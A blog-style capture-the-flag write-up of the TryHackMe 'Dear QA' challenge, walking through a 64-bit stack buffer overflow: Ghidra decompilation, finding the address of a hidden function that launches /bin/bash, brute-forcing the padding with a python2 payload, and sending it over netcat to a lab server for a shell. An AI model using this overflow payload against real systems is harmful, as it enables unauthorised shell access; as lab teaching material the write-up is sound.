This was [Dear QA](https://tryhackme.com/room/dearqa) from THM, an Easy rated "reverse engineering and exploit development" challenge. I'm not very good at these so I struggled a bit but got it done. 

## Binary
We were given a binary to inspect: **DearQA.DearQA**

{% highlight shell %}
â”Œâ”€â”€(rootðŸ’€kali)-[/opt/thm/dearqa]
â””â”€# file DearQA.DearQA                                                                                                                                
DearQA.DearQA: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8dae71dcf7b3fe612fe9f7a4d0fa068ff3fc93bd, not stripped
{% endhighlight %}

I disassembled the file in Ghidra and we have two notable functions, *main* and *vuln*. 

Main (as per Ghidra):

{% highlight c %}
undefined8 main(void)

{
  char local_28 [32];
  
  puts("Welcome dearQA");
  puts("I am sysadmin, i am new in developing");
  printf("What\'s your name: ");
  fflush(stdout);
  __isoc99_scanf(&DAT_00400851,local_28);
  printf("Hello: %s\n",local_28);
  return 0;
}
{% endhighlight %}

and Vuln:

{% highlight c %}
void vuln(void)

{
  puts("Congratulations!");
  puts("You have entered in the secret function!");
  fflush(stdout);
  execve("/bin/bash",(char **)0x0,(char **)0x0);
  return;
}
{% endhighlight %}

Note that **vuln** is never called during the execution of **main** and hence the challenge is to gain execution of vuln, which we do by overflowing the buffer in *scanf*, here referred to as **__isoc99_scanf** which I gather is a compiler specific implementation of scanf. 

The same type of thing is described [here](https://d0nut.medium.com/week-13-introduction-to-buffer-overflows-5f15c0d5b5c1) and [here](http://www.cpp.re/forum/unices/256152/); note that the first example is for a 32-bit binary which is *not* the case for us. 

We need the entry point for the **vuln** function which we can get from Ghidra:

{% highlight asm %}
00400686 55              PUSH       RBP
{% endhighlight %}

Or GDB:

{% highlight shell %}
â””â”€# gdb DearQA.DearQA                                                                                                                                                           16 â¨¯

{% endhighlight %}

Or [Binary Ninja](https://binary.ninja/), which I downloaded a trial version of. 

Our address is **0x400686**, or in Little Endian **\x86\x06\x40** and we need to pad this to the right size: **\x86\x06\x40\x00\x00\x00\x00\x00**.

Next, we need to figure out how many dummy chars to insert before our address. I tried to figure this out for myself but I didn't seem to be able to get it right, so in the end I let bash do it for me. We did know that it was at least 32 though, since that was the buffer size per Ghidra.

{% highlight shell %}
â”Œâ”€â”€(rootðŸ’€kali)-[/opt/thm/dearqa]
â””â”€#for i in {32..40}; do echo "i is $i" && python2 -c "print $i * 'A' + '\x86\x06\x40\x00\x00\x00\x00\x00'" | ./DearQA.DearQA; done
i is 32
Welcome dearQA
I am sysadmin, i am new in developing
Whats your name: Hello: AAAAAAAAAAï¿½@
# etc
i is 40
Welcome dearQA
I am sysadmin, i am new in developing
Whats your name: Hello: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAï¿½@
Congratulations!
You have entered in the secret function!
{% endhighlight %}

Now we send our 'exploit' to the same binary running on a remote server and gain a shell. Piping the command to netcat results in a session that immediately dies so we need some fancy [syntax](https://itectec.com/superuser/how-to-pipe-commands-to-a-netcat-that-will-stay-alive/) like so:

{% highlight shell %}
â”Œâ”€â”€(rootðŸ’€kali)-[/opt/thm/dearqa]
â””â”€# cat <(python2 -c "print 40 * 'A' + '\x86\x06\x40\x00\x00\x00\x00\x00'") - | nc 10.10.90.142 5700                                                                             1 â¨¯
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAï¿½^F@^@^@^@^@^@
Welcome dearQA
